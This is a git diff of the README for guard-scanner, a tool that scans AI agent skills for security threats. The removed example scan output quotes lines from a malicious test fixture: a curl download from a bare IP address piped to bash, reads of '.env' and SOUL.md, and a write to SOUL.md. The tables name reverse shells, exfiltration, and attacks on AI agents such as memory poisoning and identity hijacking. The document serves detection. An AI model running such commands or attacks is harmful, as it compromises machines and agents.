@@ -2,24 +2,21 @@
 
 *The Original, Zero-Dependency Shield for the AI Agent Era.*
 
-As autonomous AI agents become more prevalent, the risk of executing untrusted or malicious skills increases. **guard-scanner** is an open-source, zero-dependency static and runtime security scanner designed to help protect developers' local machines from Prompt Injections, RCEs, and Memory Poisoning.
+As autonomous AI agents become more prevalent, the risk of executing untrusted or malicious skills increases. **guard-scanner** is an open-source, zero-dependency security platform designed to protect developers from Prompt Injections, RCEs, Memory Poisoning, and supply chain attacks.
 
-Built collaboratively by the **[Guava Parity Institute](https://github.com/koatora20)** and the open-source community. We believe that AI safety infrastructure should be a shared, transparent, and accessible resource for everyone. We welcome contributions, feedback, and discussion from all developers!
+Built by the **[Guava Parity Institute](https://github.com/koatora20)** and the open-source community.
 
-**150 static patterns + 26 runtime checks** across **23 threat categories**.
+**166 static patterns + 26 runtime checks + asset audit + VirusTotal integration + real-time watch.**
 
-[![npm](https://img.shields.io/npm/v/guard-scanner)](https://www.npmjs.com/package/guard-scanner)
+[![npm](https://img.shields.io/npm/v/@guava-parity/guard-scanner)](https://www.npmjs.com/package/@guava-parity/guard-scanner)
 [![license](https://img.shields.io/npm/l/guard-scanner)](LICENSE)
+[![tests](https://img.shields.io/badge/tests-206%2F206-brightgreen)](#test-results)
 
 ## Install
 
 ```bash
-npm install -g guard-scanner
+npm install -g @guava-parity/guard-scanner
 ```
-
-> **Why use this?** If you are experimenting with third-party skills for your AI agents, `guard-scanner` acts as a basic safety net, helping to identify hidden prompts or dangerous execution patterns.
-> 
-> 🤝 **We need your help!**: The landscape of Agentic AI threats is evolving rapidly. We are maintaining this project out of goodwill to provide a baseline defense, but we rely on community contributions to keep our pattern database updated. If you find a false positive or a new threat vector, please consider opening an issue or a pull request!
 
 ## Quick Start
 
@@ -36,12 +33,10 @@ guard-scanner ./skills/ --format sarif --quiet | upload-sarif
 
 ## 🔍 Example Scan Output
 
-This is actual output from scanning a malicious test skill demonstrating data exfiltration, memory poisoning, and credential theft:
-
 ```console
 $ guard-scanner ./test/fixtures/malicious-skill/ --verbose
 
-🛡️  guard-scanner v5.0.5
+🛡️  guard-scanner v8.0.0
 ══════════════════════════════════════════════════════
 📂 Scanning: ./test/fixtures/malicious-skill/
 📦 Skills found: 1
@@ -52,38 +47,84 @@ $ guard-scanner ./test/fixtures/malicious-skill/ --verbose
    📁 malicious-code
       🔴 [HIGH] eval() call — evil.js:18
       💀 [CRITICAL] Shell download/execution — stealer.js:19
-         └─ "exec(`curl https://91.92.242.30/payload -o /tmp/x && bash"
    📁 credential-handling
       🔴 [HIGH] Credential file read — evil.js:6
-         └─ "readFileSync('.env"
       💀 [CRITICAL] Agent identity file read — evil.js:7
-         └─ "readFileSync('SOUL.md"
    📁 memory-poisoning
       💀 [CRITICAL] Write to agent soul file — evil.js:21
-         └─ "writeFileSync('SOUL.md"
-   📁 data-flow
-      💀 [CRITICAL] Data flow: secret read (L6) → network call (L10) — evil.js:6
-
-══════════════════════════════════════════════════════
-📊 guard-scanner Scan Summary
-──────────────────────────────────────────────────────
-   Scanned:      1
-   🟢 Clean:       0
-   🔴 Malicious:   1
-   Safety Rate:  0%
-══════════════════════════════════════════════════════
-⚠️  CRITICAL: 1 malicious skill(s) detected!
 ```
 
-## 🚀 Standalone Architecture
+## 🔎 Asset Audit (V6+)
 
-**guard-scanner** is designed as a foundational "Shield" for the OpenClaw ecosystem. 
-It features a **Standalone Boot Sequence**:
-- **Zero API/DB Dependencies**: It initializes purely from local, static Threat Patterns (147 regex rules) defined in its codebase.
-- **No Heavy Context Loading**: It does *not* require loading heavy memory databases or executing contextual commands.
-- **Privacy First**: It never accesses or exposes your agent's private memory during the boot phase.
+Audit your npm packages, GitHub repos, and ClawHub skills for leaked credentials and security exposure.
 
-This lightweight initialization makes it perfect for zero-trust environments, ensuring complete safety without exposing proprietary agent logic.
+```bash
+# npm — detect leaked node_modules, .env files, scope duplicates
+guard-scanner audit npm <username> --verbose
+
+# GitHub — detect committed secrets, large repos, .env/.key files
+guard-scanner audit github <username> --format json
+
+# ClawHub — detect malicious skills, suspicious DL/star ratios
+guard-scanner audit clawhub <query>
+
+# All providers at once
+guard-scanner audit all <username> --verbose
+```
+
+## 🦠 VirusTotal Integration (V7+)
+
+Combine guard-scanner's semantic detection with VirusTotal's 70+ antivirus engines for **Double-Layered Defense**.
+
+| Layer | Engine | Focus |
+|---|---|---|
+| **Semantic** | guard-scanner | Prompt injection, memory poisoning, supply chain |
+| **Signature** | VirusTotal | Known malware, trojans, C2 infrastructure |
+
+```bash
+# 1. Get free API key at https://www.virustotal.com (¥0)
+# 2. Set environment variable
+export VT_API_KEY=your-api-key-here
+
+# 3. Use with any command
+guard-scanner scan ./skills/ --vt-scan
+guard-scanner audit npm koatora20 --vt-scan
+```
+
+> **Free tier**: 4 req/min, 500/day, 15,500/month. Personal use only.  
+> **VT is optional** — guard-scanner works fully without it.
+
+## 👁️ Real-time Watch Mode (V8+)
+
+Monitor your skills directory for changes and scan automatically.
+
+```bash
+# Start watching
+guard-scanner watch ./skills/ --strict --verbose
+
+# With Soul Lock protection
+guard-scanner watch ./skills/ --strict --soul-lock
+```
+
+Press `Ctrl+C` for session stats.
+
+## 📊 CI/CD Integration (V8+)
+
+Native support for CI/CD pipelines via `CIReporter`:
+
+| Platform | Format |
+|---|---|
+| GitHub Actions | `::error` / `::warning` annotations + Step Summary |
+| GitLab | Code Quality JSON report |
+| Any | Webhook notification (HTTPS POST) |
+
+```bash
+# GitHub Actions
+guard-scanner ./skills/ --format sarif --quiet > report.sarif
+
+# GitLab
+guard-scanner ./skills/ --format json --quiet > gl-code-quality-report.json
+```
 
 ## Options
 
@@ -92,12 +133,13 @@ This lightweight initialization makes it perfect for zero-trust environments, en
 | `--verbose`, `-v` | Detailed findings with categories and samples |
 | `--strict` | Lower detection thresholds (more sensitive) |
 | `--check-deps` | Scan `package.json` for dependency chain risks |
-| `--soul-lock` | Enable agent identity protection (SOUL.md/MEMORY.md patterns) |
+| `--soul-lock` | Enable agent identity protection |
+| `--vt-scan` | Enable VirusTotal hash/URL/domain lookup |
 | `--json` | Write JSON report to file |
-| `--sarif` | Write SARIF 2.1.0 report (GitHub Code Scanning) |
+| `--sarif` | Write SARIF 2.1.0 report |
 | `--html` | Write HTML dashboard report |
 | `--format json\|sarif` | Print to stdout (pipeable) |
-| `--quiet` | Suppress text output (use with `--format`) |
+| `--quiet` | Suppress text output |
 | `--self-exclude` | Skip scanning guard-scanner itself |
 | `--summary-only` | Only print the summary table |
 | `--rules <file>` | Load custom detection rules (JSON) |
@@ -107,31 +149,28 @@ This lightweight initialization makes it perfect for zero-trust environments, en
 ## Threat Categories (23)
 
 | # | Category | Detects |
-|---|----------|---------|
-| 1 | Prompt Injection | Hidden instructions, invisible Unicode, homoglyphs, XML tag injection |
-| 2 | Malicious Code | `eval()`, `child_process`, reverse shells, raw sockets |
-| 3 | Suspicious Downloads | `curl\|bash`, executable downloads, password-protected archives |
-| 4 | Credential Handling | `.env` reads, SSH keys, sudo in instructions |
-| 5 | Secret Detection | Hardcoded API keys, AWS keys, GitHub tokens, Shannon entropy |
-| 6 | Exfiltration | webhook.site, DNS tunneling, curl data exfil |
+|---|----------|---------| 
+| 1 | Prompt Injection | Hidden instructions, invisible Unicode, homoglyphs |
+| 2 | Malicious Code | `eval()`, `child_process`, reverse shells |
+| 3 | Suspicious Downloads | `curl\|bash`, executable downloads |
+| 4 | Credential Handling | `.env` reads, SSH keys |
+| 5 | Secret Detection | Hardcoded API keys, Shannon entropy |
+| 6 | Exfiltration | webhook.site, DNS tunneling |
 | 7 | Unverifiable Deps | Remote dynamic imports |
-| 8 | Financial Access | Crypto transactions, payment APIs |
-| 9 | Obfuscation | Base64→exec, hex encoding, `String.fromCharCode` |
-| 10 | Prerequisites Fraud | Fake download/paste instructions |
-| 11 | Leaky Skills | Secrets saved in agent memory, verbatim in commands |
-| 12 | Memory Poisoning ⚿ | SOUL.md/MEMORY.md modification, behavioral rule override |
-| 13 | Prompt Worm | Self-replicating prompts, agent-to-agent propagation |
-| 14 | Persistence | Cron, launchd, startup execution |
-| 15 | CVE Patterns | CVE-2026-25253 (RCE), CVE-2026-25905 (Pyodide), CVE-2026-27825 (path traversal) |
-| 16 | MCP Security | Tool/schema poisoning, SSRF, shadow server registration |
-| 16b | Trust Boundary | Calendar/email/web → code execution chains |
-| 16c | Advanced Exfiltration | ZombieAgent static URL arrays, drip exfil, beacon |
-| 16d | Safeguard Bypass | URL parameter injection, retry-on-block |
-| 17 | Identity Hijacking ⚿ | SOUL.md overwrite, persona swap, memory wipe |
-| 18 | Config Impact | `openclaw.json` writes, exec approval disabling |
-| 19 | PII Exposure | Hardcoded CC/SSN, PII logging, Shadow AI API calls |
-| 20 | Trust Exploitation | Authority claims, creator impersonation, fake audits |
-| 21 | VDB Injection | Vector database poisoning, embedding manipulation |
+| 8 | Financial Access | Crypto transactions |
+| 9 | Obfuscation | Base64→exec, hex encoding |
+| 10 | Prerequisites Fraud | Fake download instructions |
+| 11 | Leaky Skills | Secrets in memory |
+| 12 | Memory Poisoning ⚿ | SOUL.md modification |
+| 13 | Prompt Worm | Self-replicating prompts |
+| 14 | Persistence | Cron, launchd |
+| 15 | CVE Patterns | CVE-2026-2256/25046/25253/25905/27825 |
+| 16 | MCP Security | Tool poisoning, SSRF, shadow servers |
+| 17 | Identity Hijacking ⚿ | Persona swap, memory wipe |
+| 18 | Config Impact | OpenClaw config writes |
+| 19 | PII Exposure | CC/SSN, Shadow AI calls |
+| 20 | Trust Exploitation | Authority claims, fake audits |
+| 21 | VDB Injection | Vector DB poisoning |
 
 > ⚿ = Requires `--soul-lock` flag (opt-in)
 
@@ -141,60 +180,44 @@ Real-time `before_tool_call` hook that blocks dangerous operations.
 
 | Layer | Name | Checks |
 |-------|------|--------|
-| 1 | Threat Detection | Reverse shell, curl\|bash, SSRF, credential exfil |
+| 1 | Threat Detection | Reverse shell, curl\|bash, SSRF |
 | 2 | Trust Defense | SOUL.md tampering, memory injection |
-| 3 | Safety Judge | Prompt injection in tool args, trust bypass |
+| 3 | Safety Judge | Prompt injection in tool args |
 | 4 | Behavioral | No-research execution |
-| 5 | Trust Exploitation (ASI09) | Authority claim, creator bypass, fake audit |
-
-```bash
-# Install as OpenClaw hook
-openclaw hooks install skills/guard-scanner/hooks/guard-scanner
-openclaw hooks enable guard-scanner
-```
-
-Modes: `monitor` (log only) / `enforce` (block CRITICAL) / `strict` (block HIGH+CRITICAL)
-
-## OWASP Mapping
-
-- **OWASP LLM Top 10 2025**: LLM01–LLM10 fully mapped
-- **OWASP Agentic Security Top 10**: ASI01–ASI10 coverage (tested)
+| 5 | Trust Exploitation | Authority claim, creator bypass |
 
 ## Test Results
 
 ```
-ℹ tests 136
-ℹ suites 24
-ℹ pass 136
+ℹ tests 206
+ℹ suites 43
+ℹ pass 206
 ℹ fail 0
-ℹ duration_ms 165
+ℹ duration_ms 376
 ```
 
 | Suite | Tests |
 |-------|-------|
 | Malicious Skill Detection | 16 ✅ |
 | Clean Skill (False Positive) | 2 ✅ |
-| Risk Score Calculation | 5 ✅ |
-| Verdict Determination | 5 ✅ |
+| Risk Score / Verdict | 10 ✅ |
 | Output Formats (JSON/SARIF/HTML) | 4 ✅ |
-| Pattern Database (150 patterns, 23 categories) | 4 ✅ |
+| Pattern DB (166 patterns, 23 cats) | 4 ✅ |
 | IoC Database | 5 ✅ |
 | Shannon Entropy | 2 ✅ |
-| Ignore Functionality | 1 ✅ |
-| Plugin API | 1 ✅ |
-| Skill Manifest Validation | 4 ✅ |
-| Code Complexity Metrics | 2 ✅ |
-| Report Noise Regression | 2 ✅ |
-| Config Impact Analysis | 4 ✅ |
-| PII Exposure Detection | 8 ✅ |
-| OWASP Agentic Security (ASI01–10) | 14 ✅ |
-| Runtime Guard (5 layers, 26 checks) | 25 ✅ |
-| CVE Detection (CVE-2026-25905, CVE-2026-27825) | 2 ✅ |
+| Plugin API / Custom Rules | 2 ✅ |
+| Skill Manifest | 4 ✅ |
+| Code Complexity | 2 ✅ |
+| Config / PII / OWASP | 26 ✅ |
+| Runtime Guard (5 layers) | 25 ✅ |
+| CVE Detection | 5 ✅ |
+| **Asset Audit (npm/GitHub/ClawHub)** | **32 ✅** |
+| **VirusTotal Integration** | **20 ✅** |
+| **Watcher + CI/CD** | **15 ✅** |
 
 ## Plugin API
 
 ```javascript
-// my-plugin.js
 module.exports = {
   name: 'my-plugin',
   patterns: [
@@ -207,43 +230,9 @@ module.exports = {
 guard-scanner ./skills/ --plugin ./my-plugin.js
 ```
 
-## Custom Rules (JSON)
-
-```json
-[
-  {
-    "id": "CUSTOM_001",
-    "pattern": "dangerous_function\\(",
-    "flags": "gi",
-    "severity": "HIGH",
-    "cat": "malicious-code",
-    "desc": "Custom: dangerous function call",
-    "codeOnly": true
-  }
-]
-```
-
-```bash
-guard-scanner ./skills/ --rules ./my-rules.json
-```
-
-## Output Formats
-
-- **Terminal** — Color-coded verdicts with risk scores
-- **JSON** — Machine-readable report (`--json`)
-- **SARIF 2.1.0** — GitHub Code Scanning / CI/CD (`--sarif`)
-- **HTML** — Visual dashboard (`--html`)
-- **stdout** — Pipeable output (`--format json|sarif --quiet`)
-
 ## Contributing
 
-We wholeheartedly welcome contributions! Guard-scanner is built on community knowledge. 
-
-Whether you're fixing a bug, adding a new threat pattern, or simply improving the documentation, your help is deeply appreciated. Please see our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started.
-
-## Code of Conduct
-
-We are committed to fostering a welcoming, respectful, and harassment-free environment. Please read our [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) before participating in our community.
+We welcome contributions! Whether fixing bugs, adding threat patterns, or improving docs.
 
 ## License
 
